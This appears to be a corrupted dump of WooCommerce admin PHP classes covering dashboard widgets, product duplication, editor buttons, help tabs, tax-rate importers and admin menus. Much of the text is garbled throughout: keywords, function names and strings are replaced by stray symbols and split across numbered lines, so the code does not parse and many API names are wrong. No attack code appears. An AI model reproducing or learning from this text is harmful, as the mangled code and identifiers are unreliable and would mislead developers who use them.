="<?phpƒcho‡dmin_url( 'edit.php?s&post_status=all&post_type=shop_order&shop_order_status=on-hold' ); ?>">

150 <?
php
 
	`´štf
Ğ
	`_n
Ğ"<¡rÚg>% Üd”</¡rÚg> on-hŞd", "<¡rÚg>% Üd”s</¡rÚg> on-hŞd", 
$Ú_hŞd_couÁ
, 'woocommerce' ), $on_hold_count ); ?>

151 </
a
>

152 </
li
>

153 <
li
 
şass
="low-in-stock">

154 <
a
 
h»f
="<?phpƒcho‡dmin_url( 'admin.php?page=wc-reports&tab=stock&report=low_in_stock' ); ?>">

155 <?
php
 
	`´štf
Ğ
	`_n
Ğ"<¡rÚg>% ´oduù</¡rÚg>†ow iÀ¡ock", "<¡rÚg>% ´oduùs</¡rÚg>†ow iÀ¡ock", 
$lowš¡ock_couÁ
, 'woocommerce' ), $lowinstock_count ); ?>

156 </
a
>

157 </
li
>

158 <
li
 
şass
="out-of-stock">

159 <
a
 
h»f
="<?phpƒcho‡dmin_url( 'admin.php?page=wc-reports&tab=stock&report=out_of_stock' ); ?>">

160 <?
php
 
	`´štf
Ğ
	`_n
Ğ"<¡rÚg>% ´oduù</¡rÚg> ouˆoà¡ock", "<¡rÚg>% ´oduùs</¡rÚg> ouˆoà¡ock", 
$outof¡ock_couÁ
, 'woocommerce' ), $outofstock_count ); ?>

161 </
a
>

162 </
li
>

163 </
ul
>

164 <?
php


165 
	}
}

170 
public
 
funùiÚ
 
	$»ûÁ_»v›ws
() {

171 
glob®
 
$wpdb
;

172 
$comm’ts
 = 
$wpdb
->
	`g‘_»suÉs
( "SELECT *, SUBSTRING(comment_content,1,100) AS comment_excerpt

173 
FROM
 
$wpdb
->
comm’ts


174 
LEFT
 
JOIN
 
$wpdb
->
po¡s
 
	`ON
 ($wpdb->
comm’ts
.
comm’t_po¡_ID
 = $wpdb->po¡s.
ID
)

175 
WHERE
 
comm’t_­´oved
 = '1'

176 
AND
 
comm’t_ty³
 = ''

177 
AND
 
po¡_·sswÜd
 = ''

178 
AND
 
po¡_ty³
 = 'product'

179 
ORDER
 
BY
 
comm’t_d©e_gmt
 
DESC


180 
LIMIT
 8" );

182 iàĞ
$comm’ts
 ) {

183 
echo
 '<ul>';

184 
	`fÜ—ch
 ( 
$comm’ts
 
as
 
$comm’t
 ) {

186 
echo
 '<li>';

188 
echo
 
	`g‘_av©¬
Ğ
$comm’t
->
comm’t_authÜ
, '32' );

190 
$¿tšg
 = 
	`g‘_comm’t_m‘a
Ğ
$comm’t
->
comm’t_ID
, '¿tšg', 
Œue
 );

192 
echo
 '<div cÏss="¡¬-¿tšg"™Ë="' . 
	`esc_©Œ
Ğ
$¿tšg
 ) . '">

193 <
¥ª
 
¡yË
="width:'. ( $¿tšg * 20 ) . '%">' . $¿tšg . ' ' . __Ğ'
out
 
of
 5', '
woocomm”û
' ) . '</¥ª></
div
>';

195 
echo
 '<h4 cÏss="m‘a"><¨h»f="' . 
	`g‘_³rm®šk
Ğ
$comm’t
->
ID
 ) . '#comm’t-' . 
	`absšt
Ğ$comm’t->
comm’t_ID
 ) .'">' . 
	`esc_html__
Ğ$comm’t->
po¡_t™Ë
 ) . '</a> ' . 
	`__
Ğ'»v›wed by', 'woocomm”û' ) . ' ' . 
	`esc_html
Ğ$comm’t->
comm’t_authÜ
 ) .'</h4>';

196 
echo
 '<blockquÙe>' . 
	`wp_k£s_d©a
Ğ
$comm’t
->
comm’t_exû½t
 ) . ' [...]</blockquote></li>';

199 
echo
 '</ul>';

201 
echo
 '<p>' . 
	`__
( 'There‡re‚o…roduct„eviews yet.', 'woocommerce' ) . '</p>';

203 
	}
}

207 
	g’dif
;

209  
Ãw
 
WC_Admš_Dashbßrd
();

	@includes/admin/class-wc-admin-duplicate-product.php

1 <?
php


11 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

13 iàĞ! 
şass_exi¡s
( 'WC_Admin_Duplicate_Product' ) ) :

18 şas 
	cWC_Admš_Du¶iÿ‹_Produù
 {

23 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

24 
	`add_aùiÚ
Ğ'admš_aùiÚ_du¶iÿ‹_´oduù', 
	`¬¿y
Ğ
$this
, 'duplicate_product_action' ) );

25 
	`add_f‹r
Ğ'po¡_row_aùiÚs', 
	`¬¿y
Ğ
$this
, 'dupe_link' ), 10, 2 );

26 
	`add_f‹r
Ğ'·ge_row_aùiÚs', 
	`¬¿y
Ğ
$this
, 'dupe_link' ), 10, 2 );

27 
	`add_aùiÚ
Ğ'po¡_subm™box_¡¬t', 
	`¬¿y
Ğ
$this
, 'dupe_button' ) );

36 
public
 
funùiÚ
 
	$du³_lšk
Ğ
$aùiÚs
, 
$po¡
 ) {

37 iàĞ! 
	`cu¼’t_u£r_ÿn
Ğ
	`­¶y_f‹rs
( 'woocommerce_duplicate_product_capability', 'manage_woocommerce' ) ) )

38  
$aùiÚs
;

40 iàĞ
$po¡
->
po¡_ty³
 != 'product' )

41  
$aùiÚs
;

43 
$aùiÚs
['du¶iÿ‹'] = '<¨h»f="' . 
	`wp_nÚû_u¾
Ğ
	`admš_u¾
Ğ'ed™.php?po¡_ty³õroduù&aùiÚ=du¶iÿ‹_´oduù&amp;po¡=' . 
$po¡
->
ID
 ), 'woocomm”û-du¶iÿ‹-´oduù_' . $po¡->ID ) . '"™Ë="' . 
	`__
( 'Make‡ duplicate fromhis…roduct', 'woocommerce' )

44 . '"„–="³rm®šk">' . 
	`__
( 'Duplicate', 'woocommerce' ) . '</a>';

46  
$aùiÚs
;

47 
	}
}

52 
public
 
funùiÚ
 
	$du³_bu‰Ú
() {

53 
glob®
 
$po¡
;

55 iàĞ! 
	`cu¼’t_u£r_ÿn
Ğ
	`­¶y_f‹rs
( 'woocommerce_duplicate_product_capability', 'manage_woocommerce' ) ) )

58 iàĞ! 
	`is_objeù
Ğ
$po¡
 ) )

61 iàĞ
$po¡
->
po¡_ty³
 != 'product' )

64 iàĞ
	`is£t
Ğ
$_GET
['post'] ) ) {

65 
$nÙifyU¾
 = 
	`wp_nÚû_u¾
Ğ
	`admš_u¾
Ğ"ed™.php?po¡_ty³õroduù&aùiÚ=du¶iÿ‹_´oduù&po¡=" . 
	`absšt
Ğ
$_GET
['post'] ) ), 'woocommerce-duplicate-product_' . $_GET['post'] );

67 <
div
 
id
="du¶iÿ‹-aùiÚ"><
a
 
şass
="subm™du¶iÿ‹ du¶iÿtiÚ" 
h»f
="<?ph°echØesc_u¾Ğ$nÙifyU¾ ); ?>"><?
php
 
	`_e
( 'Copyo‡‚ew draft', 'woocommerce' ); ?></a></div>

68 <?
php


70 
	}
}

75 
public
 
funùiÚ
 
	$du¶iÿ‹_´oduù_aùiÚ
() {

76 iàĞ
	`em±y
Ğ
$_REQUEST
['post'] ) ) {

77 
	`wp_d›
(
	`__
( 'No…roducto duplicate has been supplied!', 'woocommerce' ));

81 
$id
 = 
	`is£t
Ğ
$_REQUEST
['po¡'] ) ? 
	`absšt
( $_REQUEST['post'] ) : '';

83 
	`check_admš_»ã»r
Ğ'woocomm”û-du¶iÿ‹-´oduù_' . 
$id
 );

85 
$po¡
 = 
$this
->
	`g‘_´oduù_to_du¶iÿ‹
Ğ
$id
 );

88 iàĞ! 
	`em±y
Ğ
$po¡
 ) ) {

89 
$Ãw_id
 = 
$this
->
	`du¶iÿ‹_´oduù
Ğ
$po¡
 );

93 
	`do_aùiÚ
Ğ'woocomm”û_du¶iÿ‹_´oduù', 
$Ãw_id
, 
$po¡
 );

96 
	`wp_»dœeù
Ğ
	`admš_u¾
Ğ'po¡.php?aùiÚód™&po¡=' . 
$Ãw_id
 ) );

97 
ex™
;

99 
	`wp_d›
(
	`__
Ğ'Produù c»©iÚ faed, could‚Ù fšd origš®…roduù:', 'woocomm”û' ) . ' ' . 
$id
 );

101 
	}
}

112 
public
 
funùiÚ
 
du¶iÿ‹_´oduù
Ğ
$po¡
, 
$·»Á
 = 0, 
$po¡_¡©us
 = '' ) {

113 
glob®
 
$wpdb
;

115 
	g$Ãw_po¡_authÜ
 = 
wp_g‘_cu¼’t_u£r
();

116 
	g$Ãw_po¡_d©e
 = 
cu¼’t_time
('mysql');

117 
	g$Ãw_po¡_d©e_gmt
 = 
g‘_gmt_äom_d©e
(
$Ãw_po¡_d©e
);

119 iàĞ
	g$·»Á
 > 0 ) {

120 
	g$po¡_·»Á
 = 
$·»Á
;

121 
	g$po¡_¡©us
 = 
$po¡_¡©us
 ? $post_status : 'publish';

122 
	g$suffix
 = '';

124 
	g$po¡_·»Á
 = 
$po¡
->
po¡_·»Á
;

125 
	g$po¡_¡©us
 = 
$po¡_¡©us
 ? $post_status : 'draft';

126 
	g$suffix
 = ' ' . 
__
( '(Copy)', 'woocommerce' );

129 
	g$Ãw_po¡_ty³
 = 
$po¡
->
po¡_ty³
;

130 
	g$po¡_cÚ‹Á
 = 
¡r_»¶aû
("'", "''", 
$po¡
->
po¡_cÚ‹Á
);

131 
	g$po¡_cÚ‹Á_f‹»d
 = 
¡r_»¶aû
("'", "''", 
$po¡
->
po¡_cÚ‹Á_f‹»d
);

132 
	g$po¡_exû½t
 = 
¡r_»¶aû
("'", "''", 
$po¡
->
po¡_exû½t
);

133 
	g$po¡_t™Ë
 = 
¡r_»¶aû
("'", "''", 
$po¡
->
po¡_t™Ë
).
	g$suffix
;

134 
	g$po¡_Çme
 = 
¡r_»¶aû
("'", "''", 
$po¡
->
po¡_Çme
);

135 
	g$comm’t_¡©us
 = 
¡r_»¶aû
("'", "''", 
$po¡
->
comm’t_¡©us
);

136 
	g$pšg_¡©us
 = 
¡r_»¶aû
("'", "''", 
$po¡
->
pšg_¡©us
);

139 
	g$wpdb
->
qu”y
(

141 (
po¡_authÜ
, 
po¡_d©e
, 
po¡_d©e_gmt
, 
po¡_cÚ‹Á
, 
po¡_cÚ‹Á_f‹»d
, 
po¡_t™Ë
, 
po¡_exû½t
, 
po¡_¡©us
, 
po¡_ty³
, 
comm’t_¡©us
, 
pšg_¡©us
, 
po¡_·sswÜd
, 
to_pšg
, 
pšged
, 
po¡_modif›d
, 
po¡_modif›d_gmt
, 
po¡_·»Á
, 
m’u_Üd”
, 
po¡_mime_ty³
)

142 
VALUES


145 
$Ãw_po¡_id
 = 
$wpdb
->
š£¹_id
;

148 
$this
->
du¶iÿ‹_po¡_xÚom›s
Ğ
$po¡
->
ID
, 
$Ãw_po¡_id
, $po¡->
po¡_ty³
 );

151 
$this
->
du¶iÿ‹_po¡_m‘a
Ğ
$po¡
->
ID
, 
$Ãw_po¡_id
 );

154 iàĞ
$chd»n_´oduùs
 = 
g‘_chd»n
Ğ'po¡_·»Á='.
$po¡
->
ID
.'&post_type=product_variation' ) ) {

156 iàĞ
$chd»n_´oduùs
 )

157 
fÜ—ch
 ( 
$chd»n_´oduùs
 
as
 
$chd
 )

158 
$this
->
du¶iÿ‹_´oduù
Ğ$this->
g‘_´oduù_to_du¶iÿ‹
Ğ
$chd
->
ID
 ), 
$Ãw_po¡_id
, $chd->
po¡_¡©us
 );

161  
$Ãw_po¡_id
;

173 
´iv©e
 
funùiÚ
 
	$g‘_´oduù_to_du¶iÿ‹
Ğ
$id
 ) {

174 
glob®
 
$wpdb
;

176 
$id
 = 
	`absšt
( $id );

178 iàĞ! 
$id
 )

179  
çl£
;

181 
$po¡
 = 
$wpdb
->
	`g‘_»suÉs
( "SELECT * FROM $wpdb->posts WHERE ID=$id" );

183 iàĞ
	`is£t
Ğ
$po¡
->
po¡_ty³
 ) && $post->post_type == "revision" ) {

184 
$id
 = 
$po¡
->
po¡_·»Á
;

185 
$po¡
 = 
$wpdb
->
	`g‘_»suÉs
( "SELECT * FROM $wpdb->posts WHERE ID=$id" );

187  
$po¡
[0];

188 
	}
}

199 
´iv©e
 
funùiÚ
 
	$du¶iÿ‹_po¡_xÚom›s
Ğ
$id
, 
$Ãw_id
, 
$po¡_ty³
 ) {

200 
glob®
 
$wpdb
;

201 
$xÚom›s
 = 
	`g‘_objeù_xÚom›s
(
$po¡_ty³
);

202 
	`fÜ—ch
 (
$xÚom›s
 
as
 
$xÚomy
) {

203 
$po¡_‹rms
 = 
	`wp_g‘_objeù_‹rms
(
$id
, 
$xÚomy
);

204 
$po¡_‹rms_couÁ
 = Ğ
$po¡_‹rms
 );

205 
$i
=0; $i<
$po¡_‹rms_couÁ
; $i++) {

206 
	`wp_£t_objeù_‹rms
(
$Ãw_id
, 
$po¡_‹rms
[
$i
]->
¦ug
, 
$xÚomy
, 
Œue
);

209 
	}
}

219 
´iv©e
 
funùiÚ
 
	$du¶iÿ‹_po¡_m‘a
Ğ
$id
, 
$Ãw_id
 ) {

220 
glob®
 
$wpdb
;

221 
$po¡_m‘a_šfos
 = 
$wpdb
->
	`g‘_»suÉs
("SELECT meta_key, meta_value FROM $wpdb->postmeta WHERE…ost_id=$id");

223 ià(
	`couÁ
(
$po¡_m‘a_šfos
)!=0) {

224 
$sql_qu”y_£l
 = 
	`¬¿y
();

225 
$sql_qu”y
 = "INSERT INTO $wpdb->postmeta (post_id, meta_key, meta_value) ";

226 
	`fÜ—ch
 (
$po¡_m‘a_šfos
 
as
 
$m‘a_šfo
) {

227 
$m‘a_key
 = 
$m‘a_šfo
->
m‘a_key
;

228 
$m‘a_v®ue
 = 
	`add¦ashes
(
$m‘a_šfo
->
m‘a_v®ue
);

229 
$sql_qu”y_£l
[]= "SELECT $new_id, '$meta_key', '$meta_value'";

231 
$sql_qu”y
.ğ
	`im¶ode
(" UNION ALL ", 
$sql_qu”y_£l
);

232 
$wpdb
->
	`qu”y
(
$sql_qu”y
);

234 
	}
}

238 
’dif
;

240  
Ãw
 
WC_Admš_Du¶iÿ‹_Produù
();

	@includes/admin/class-wc-admin-editor.php

1 <?
php


13 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

20 şas 
	cWC_Admš_Ed™Ü
 {

25 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

26 
	`add_aùiÚ
Ğ'admš_š™', 
	`¬¿y
Ğ
$this
, 'add_shortcode_button' ) );

27 
	`add_f‹r
Ğ'tšy_mû_v”siÚ', 
	`¬¿y
Ğ
$this
, 'refresh_mce' ) );

28 
	`add_f‹r
Ğ'mû_ex‹º®_Ïnguages', 
	`¬¿y
Ğ
$this
, 'add_tinymce_lang' ), 10, 1 );

34 
public
 
funùiÚ
 
	$add_shÜtcode_bu‰Ú
() {

35 iàĞ! 
	`cu¼’t_u£r_ÿn
('edit_posts') && ! current_user_can('edit_pages') ) ;

36 iàĞ
	`g‘_u£r_İtiÚ
('rich_editing') == 'true') :

37 
	`add_f‹r
Ğ'mû_ex‹º®_¶ugšs', 
	`¬¿y
Ğ
$this
, 'add_shortcode_tinymce_plugin' ) );

38 
	`add_f‹r
Ğ'mû_bu‰Ús', 
	`¬¿y
Ğ
$this
, 'register_shortcode_button' ) );

39 
’dif
;

40 
	}
}

48 
public
 
funùiÚ
 
	$add_tšymû_Ïng
Ğ
$¬r
 ) {

49 
$¬r
['WooComm”ûShÜtcodes'] = 
	`WC
()->
	`¶ugš_·th
() . '/assets/js/admin/editor_plugin_lang.php';

50  
$¬r
;

51 
	}
}

59 
public
 
funùiÚ
 
	$»gi¡”_shÜtcode_bu‰Ú
Ğ
$bu‰Ús
 ) {

60 
	`¬¿y_push
Ğ
$bu‰Ús
, "|", "woocommerce_shortcodes_button" );

61  
$bu‰Ús
;

62 
	}
}

70 
public
 
funùiÚ
 
	$add_shÜtcode_tšymû_¶ugš
Ğ
$¶ugš_¬¿y
 ) {

71 
$¶ugš_¬¿y
['WooComm”ûShÜtcodes'] = 
	`WC
()->
	`¶ugš_u¾
() . '/assets/js/admin/editor_plugin.js';

72  
$¶ugš_¬¿y
;

73 
	}
}

81 
public
 
funùiÚ
 
	$»äesh_mû
Ğ
$v”
 ) {

82 
$v”
 += 3;

83  
$v”
;

84 
	}
}

88 
Ãw
 
WC_Admš_Ed™Ü
();

	@includes/admin/class-wc-admin-help.php

1 <?
php


11 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

13 iàĞ! 
şass_exi¡s
( 'WC_Admin_Help' ) ) :

18 şas 
	cWC_Admš_H–p
 {

23 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

24 
	`add_aùiÚ
Ğ"cu¼’t_sü“n", 
	`¬¿y
Ğ
$this
, 'add_tabs' ), 50 );

30 
public
 
funùiÚ
 
	$add_bs
() {

31 
$sü“n
 = 
	`g‘_cu¼’t_sü“n
();

33 iàĞ! 
	`š_¬¿y
Ğ
$sü“n
->
id
, 
	`wc_g‘_sü“n_ids
() ) )

36 
$sü“n
->
	`add_h–p_b
Ğ
	`¬¿y
(

38 't™Ë' => 
	`__
( 'Documentation', 'woocommerce' ),

41 '<p>' . 
	`__
( 'Thank you for using WooCommerce :) Should you‚eed help using orƒxtending WooCommerce…lease„eadhe documentation.', 'woocommerce' ) . '</p>' .

43 '<p><¨h»f="' . 'h‰p://docs.woÙhemes.com/docum’tiÚ/¶ugšs/woocomm”û/' . '" cÏss="bu‰Ú bu‰Ú-´im¬y">' . 
	`__
( 'WooCommerce Documentation', 'woocommerce' ) . '</a> <a href="' . 'http://docs.woothemes.com/wc-apidocs/' . '" class="button">' . __( 'Developer API Docs', 'woocommerce' ) . '</a></p>'

47 
$sü“n
->
	`add_h–p_b
Ğ
	`¬¿y
(

49 't™Ë' => 
	`__
( 'Support', 'woocommerce' ),

52 '<p>' . 
	`¥rštf
(
	`__
( 'After <a href="%s">readinghe documentation</a>, for further‡ssistance you can usehe <a href="%s">community forum</a>, or if you have‡ccess‡s‡ WooThemes customer, <a href="%s">our support desk</a>.', 'woocommerce' ), 'http://docs.woothemes.com/documentation/plugins/woocommerce/', 'http://wordpress.org/support/plugin/woocommerce', 'http://support.woothemes.com' ) . '</p>' .

54 '<p>' . 
	`__
( 'Before‡sking for help we„ecommend checkinghe status…ageo identify‡ny…roblems with your configuration.', 'woocommerce' ) . '</p>' .

56 '<p><¨h»f="' . 
	`admš_u¾
('admš.php?·ge=wc-¡©us'è. '" cÏss="bu‰Ú bu‰Ú-´im¬y">' . 
	`__
( 'System Status', 'woocommerce' ) . '</a> <a href="' . 'http://wordpress.org/support/plugin/woocommerce' . '" class="button">' . __( 'Community Support', 'woocommerce' ) . '</a> <a href="' . 'http://support.woothemes.com' . '" class="button">' . __( 'Customer Support', 'woocommerce' ) . '</a></p>'

60 
$sü“n
->
	`add_h–p_b
Ğ
	`¬¿y
(

62 't™Ë' => 
	`__
( 'Found‡ bug?', 'woocommerce' ),

65 '<p>' . 
	`¥rštf
(
	`__
Ğ'Iàyou fšd‡ bug w™hš WooComm”û cÜyou cª c»©¨tick‘ vŸ <¨h»f="%s">G™hub issues</a>. Ensu» you„—dh<¨h»f="%s">cÚŒibutiÚ guide</a>…riÜØsubm™tšg you¸»pÜt. Ba desütiva possibË‡nd…Ëa£ inşudyou¸<¨h»f="%s">sy¡em stu »pÜt</a>.', 'woocomm”û' ), 'h‰ps://g™hub.com/woÙhemes/woocomm”û/issues?¡©e=İ’', 'h‰ps://g™hub.com/woÙhemes/woocomm”û/blob/ma¡”/CONTRIBUTING.md', 
	`admš_u¾
( 'admin.php?page=wc-status' ) ) . '</p>' .

67 '<p><¨h»f="h‰ps://g™hub.com/woÙhemes/woocomm”û/issues?¡©e=İ’" cÏss="bu‰Ú bu‰Ú-´im¬y">' . 
	`__
Ğ'R•Üˆ¨bug', 'woocomm”û' ) . '</a> <¨h»f="' . 
	`admš_u¾
('admin.php?page=wc-status') . '" class="button">' . __( 'System Status', 'woocommerce' ) . '</a></p>'

72 
$sü“n
->
	`£t_h–p_sideb¬
(

73 '<p><¡rÚg>' . 
	`__
( 'For more information:', 'woocommerce' ) . '</strong></p>' .

74 '<p><¨h»f="h‰p://www.woÙhemes.com/woocomm”û/"¬g‘="_bÏnk">' . 
	`__
( 'About WooCommerce', 'woocommerce' ) . '</a></p>' .

75 '<p><¨h»f="h‰p://wÜd´ess.Üg/ex‹nd/¶ugšs/woocomm”û/"¬g‘="_bÏnk">' . 
	`__
( 'Project on WordPress.org', 'woocommerce' ) . '</a></p>' .

76 '<p><¨h»f="h‰ps://g™hub.com/woÙhemes/woocomm”û"¬g‘="_bÏnk">' . 
	`__
( 'Project on Github', 'woocommerce' ) . '</a></p>' .

77 '<p><¨h»f="h‰p://www.woÙhemes.com/´oduù-ÿ‹gÜy/woocomm”û-ex‹nsiÚs/"¬g‘="_bÏnk">' . 
	`__
( 'Official Extensions', 'woocommerce' ) . '</a></p>' .

78 '<p><¨h»f="h‰p://www.woÙhemes.com/´oduù-ÿ‹gÜy/themes/woocomm”û/"¬g‘="_bÏnk">' . 
	`__
( 'Official Themes', 'woocommerce' ) . '</a></p>'

80 
	}
}

84 
	g’dif
;

86  
Ãw
 
WC_Admš_H–p
();

	@includes/admin/class-wc-admin-importers.php

1 <?
php


11 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

13 iàĞ! 
şass_exi¡s
( 'WC_Admin_Importers' ) ) :

18 şas 
	cWC_Admš_ImpÜ‹rs
 {

23 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

24 
	`add_aùiÚ
Ğ'admš_š™', 
	`¬¿y
Ğ
$this
, 'register_importers' ) );

25 
	`add_aùiÚ
Ğ'impÜt_¡¬t', 
	`¬¿y
Ğ
$this
, 'post_importer_compatibility' ) );

31 
public
 
funùiÚ
 
	$»gi¡”_impÜ‹rs
() {

32 
	`»gi¡”_impÜ‹r
Ğ'woocomm”û_x_¿‹_csv', 
	`__
Ğ'WooComm”û Tax R©e (CSV)', 'woocomm”û' ), __Ğ'ImpÜˆ<¡rÚg>x„©es</¡rÚg>Øyou¸¡ÜvŸ‡ csv fe.', 'woocomm”û'), 
	`¬¿y
Ğ
$this
, 'tax_rates_importer' ) );

33 
	}
}

38 
public
 
funùiÚ
 
	$x_¿‹s_impÜ‹r
() {

40 
»quœe_Úû
 
ABSPATH
 . 'wp-admin/includes/import.php';

42 iàĞ! 
	`şass_exi¡s
( 'WP_Importer' ) ) {

43 
$şass_wp_impÜ‹r
 = 
ABSPATH
 . 'wp-admin/includes/class-wp-importer.php';

44 iàĞ
	`fe_exi¡s
Ğ
$şass_wp_impÜ‹r
 ) )

45 
»quœe
 
$şass_wp_impÜ‹r
;

49 
»quœe
 'importers/class-wc-tax-rate-importer.php';

52 
$impÜ‹r
 = 
Ãw
 
	`WC_Tax_R©e_ImpÜ‹r
();

53 
$impÜ‹r
->
	`di¥©ch
();

54 
	}
}

65 
public
 
funùiÚ
 
	$po¡_impÜ‹r_com·tib™y
() {

66 
glob®
 
$wpdb
;

68 iàĞ
	`em±y
Ğ
$_POST
['impÜt_id'] ) || ! 
	`şass_exi¡s
( 'WXR_Parser' ) )

71 
$id
 = (è
$_POST
['import_id'];

72 
$fe
 = 
	`g‘_©ched_fe
Ğ
$id
 );

73 
$·r£r
 = 
Ãw
 
	`WXR_P¬£r
();

74 
$impÜt_d©a
 = 
$·r£r
->
	`·r£
Ğ
$fe
 );

76 iàĞ
	`is£t
Ğ
$impÜt_d©a
['posts'] ) ) {

77 
$po¡s
 = 
$impÜt_d©a
['posts'];

79 iàĞ
$po¡s
 && Ğ$po¡ è> 0 ) 
	`fÜ—ch
 ( $po¡ 
as
 
$po¡
 ) {

81 iàĞ
$po¡
['post_type'] == 'product' ) {

83 iàĞ
$po¡
['terms'] && ( $post['terms'] ) > 0 ) {

85 
	`fÜ—ch
 ( 
$po¡
['‹rms'] 
as
 
$‹rm
 ) {

87 
$domaš
 = 
$‹rm
['domain'];

89 iàĞ
	`¡r¡r
Ğ
$domaš
, 'pa_' ) ) {

92 iàĞ! 
	`xÚomy_exi¡s
Ğ
$domaš
 ) ) {

94 
$niûÇme
 = 
	`¡¹Şow”
Ğ
	`§n™ize_t™Ë
Ğ
	`¡r_»¶aû
Ğ'·_', '', 
$domaš
 ) ) );

96 
$exi¡s_š_db
 = 
$wpdb
->
	`g‘_v¬
Ğ$wpdb->
	`´•¬e
Ğ"SELECT‡‰ribu‹_id FROM " . $wpdb->
´efix
 . "woocomm”û_©Œibu‹_xÚom› WHERE‡‰ribu‹_Çmğ%s;", 
$niûÇme
 ) );

99 iàĞ! 
$exi¡s_š_db
 )

100 
$wpdb
->
	`š£¹
Ğ$wpdb->
´efix
 . "woocomm”û_©Œibu‹_xÚom›s", 
	`¬¿y
Ğ'©Œibu‹_Çme' => 
$niûÇme
, 'attribute_type' => 'select', 'attribute_orderby' => 'menu_order' ),‡rray( '%s', '%s', '%s' ) );

103 
	`»gi¡”_xÚomy
Ğ
$domaš
,

104 
	`­¶y_f‹rs
Ğ'woocomm”û_xÚomy_objeùs_' . 
$domaš
, 
	`¬¿y
('product') ),

105 
	`­¶y_f‹rs
Ğ'woocomm”û_xÚomy_¬gs_' . 
$domaš
, 
	`¬¿y
(

106 'h›¿rchiÿl' => 
Œue
,

107 'show_ui' => 
çl£
,

108 'qu”y_v¬' => 
Œue
,

109 '»wr™e' => 
çl£
,

119 
	}
}

122 
	g’dif
;

124  
Ãw
 
WC_Admš_ImpÜ‹rs
();

	@includes/admin/class-wc-admin-menus.php

1 <?
php


11 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

13 iàĞ! 
şass_exi¡s
( 'WC_Admin_Menus' ) ) :

18 şas 
	cWC_Admš_M’us
 {

23 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

25 
	`add_aùiÚ
Ğ'admš_m’u', 
	`¬¿y
Ğ
$this
, 'admin_menu' ), 9 );

26 
	`add_aùiÚ
Ğ'admš_m’u', 
	`¬¿y
Ğ
$this
, 'reports_menu' ), 20 );

27 
	`add_aùiÚ
Ğ'admš_m’u', 
	`¬¿y
Ğ
$this
, 'settings_menu' ), 50 );

28 
	`add_aùiÚ
Ğ'admš_m’u', 
	`¬¿y
Ğ
$this
, 'status_menu' ), 60 );

30 iàĞ
	`­¶y_f‹rs
Ğ'woocomm”û_show_addÚs_·ge', 
Œue
 ) ) {

31 
	`add_aùiÚ
Ğ'admš_m’u', 
	`¬¿y
Ğ
$this
, 'addons_menu' ), 70 );

34 
	`add_aùiÚ
Ğ'admš_h—d', 
	`¬¿y
Ğ
$this
, 'menu_highlight' ) );

35 
	`add_f‹r
Ğ'm’u_Üd”', 
	`¬¿y
Ğ
$this
, 'menu_order' ) );

36 
	`add_f‹r
Ğ'cu¡om_m’u_Üd”', 
	`¬¿y
Ğ
$this
, 'custom_menu_order' ) );

42 
public
 
funùiÚ
 
	$admš_m’u
() {

43 
glob®
 
$m’u
, 
$woocomm”û
;

45 iàĞ
	`cu¼’t_u£r_ÿn
( 'manage_woocommerce' ) )

46 
$m’u
[] = 
	`¬¿y
( '', 'read', 'separator-woocommerce', '', 'wp-menu-separator woocommerce' );

48 
$maš_·ge
 = 
	`add_m’u_·ge
Ğ
	`__
Ğ'WooComm”û', 'woocomm”û' ), __Ğ'WooComm”û', 'woocomm”û' ), 'mªage_woocomm”û', 'woocomm”û' , 
	`¬¿y
Ğ
$this
, '£‰šgs_·ge' ), 
nuÎ
, '55.5' );

50 
	`add_subm’u_·ge
Ğ'ed™.php?po¡_ty³õroduù', 
	`__
Ğ'A‰ribu‹s', 'woocomm”û' ), __Ğ'A‰ribu‹s', 'woocomm”û' ), 'mªage_´oduù_‹rms', '´oduù_©Œibu‹s', 
	`¬¿y
Ğ
$this
, 'attributes_page' ) );

51 
	}
}

56 
public
 
funùiÚ
 
	$»pÜts_m’u
() {

57 
	`add_subm’u_·ge
Ğ'woocomm”û', 
	`__
Ğ'R•Üts', 'woocomm”û' ), __Ğ'R•Üts', 'woocomm”û' ) , 'v›w_woocomm”û_»pÜts', 'wc-»pÜts', 
	`¬¿y
Ğ
$this
, 'reports_page' ) );

58 
	}
}

63 
public
 
funùiÚ
 
	$£‰šgs_m’u
() {

64 
$£‰šgs_·ge
 = 
	`add_subm’u_·ge
Ğ'woocomm”û', 
	`__
Ğ'WooComm”û S‘tšgs', 'woocomm”û' ), __Ğ'S‘tšgs', 'woocomm”û' ) , 'mªage_woocomm”û', 'wc-£‰šgs', 
	`¬¿y
Ğ
$this
, 'settings_page' ) );

66 
	`add_aùiÚ
Ğ'lßd-' . 
$£‰šgs_·ge
, 
	`¬¿y
Ğ
$this
, 'settings_page_init' ) );

67 
	}
}

72 
public
 
funùiÚ
 
	$£‰šgs_·ge_š™
() {

73 
	`WC
()->
	`·ym’t_g©eways
();

74 
	`WC
()->
	`shpšg
();

75 
	}
}

80 
public
 
funùiÚ
 
	$¡©us_m’u
() {

81 
	`add_subm’u_·ge
Ğ'woocomm”û', 
	`__
Ğ'WooComm”û Stus', 'woocomm”û' ), __Ğ'Sy¡em Stus', 'woocomm”û' ) , 'mªage_woocomm”û', 'wc-¡©us', 
	`¬¿y
Ğ
$this
, 'status_page' ) );

82 
	`»gi¡”_£‰šg
( 'woocommerce_status_settings_fields', 'woocommerce_status_options' );

83 
	}
}

88 
public
 
funùiÚ
 
	$addÚs_m’u
() {

89 
	`add_subm’u_·ge
Ğ'woocomm”û', 
	`__
Ğ'WooComm”û Add-Ús/Ex‹nsiÚs', 'woocomm”û' ), __Ğ'Add-Ús', 'woocomm”û' ) , 'mªage_woocomm”û', 'wc-addÚs', 
	`¬¿y
Ğ
$this
, 'addons_page' ) );

90 
	}
}

98 
public
 
funùiÚ
 
	$m’u_highlight
() {

99 
glob®
 
$m’u
, 
$subm’u
, 
$·»Á_fe
, 
$subm’u_fe
, 
$£lf
, 
$po¡_ty³
, 
$xÚomy
;

101 
$to_highlight_ty³s
 = 
	`¬¿y
( 'shop_order', 'shop_coupon' );

103 iàĞ
	`is£t
Ğ
